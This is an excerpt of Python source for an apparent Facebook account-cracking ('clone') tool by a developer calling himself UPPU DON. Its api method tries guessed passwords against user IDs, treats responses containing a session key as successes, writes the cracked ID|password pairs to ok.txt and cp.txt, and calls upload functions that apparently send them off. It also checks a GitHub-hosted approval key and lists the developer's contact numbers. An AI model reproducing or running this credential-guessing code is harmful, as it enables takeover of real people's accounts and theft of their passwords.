...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://m.me/Upendradon0"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/Upendradon0")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN WHATSAPP >> +97715507117")
	subprocess.check_output(["am", "start", "https://wa.me/+9779815507117"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/UPPU-DON/OLD-CLONE/blob/main/Approve.txt').text
			if basesplit in plr:
				key = basesplit
 ...
 > \033[0;92mDEVELOPER     : UPPU DON
 > \033[0;95mFACEBOOK ID   : UPPU X SUGAR
 > \033[0;41mWHATSAPP      : +9779815507117
 \033[0;96m> YOUTUBE       : UPPU EDITZ
    """)
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [UPPU] : %s/%s -> \033[0;92m [ UPPU-OK:%s ]- \033[0;93m[UPPU-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[UPPU-OK😍] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [UPPU-OK😍] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[UPPU-CP😭] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [UPPU-CP😭] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
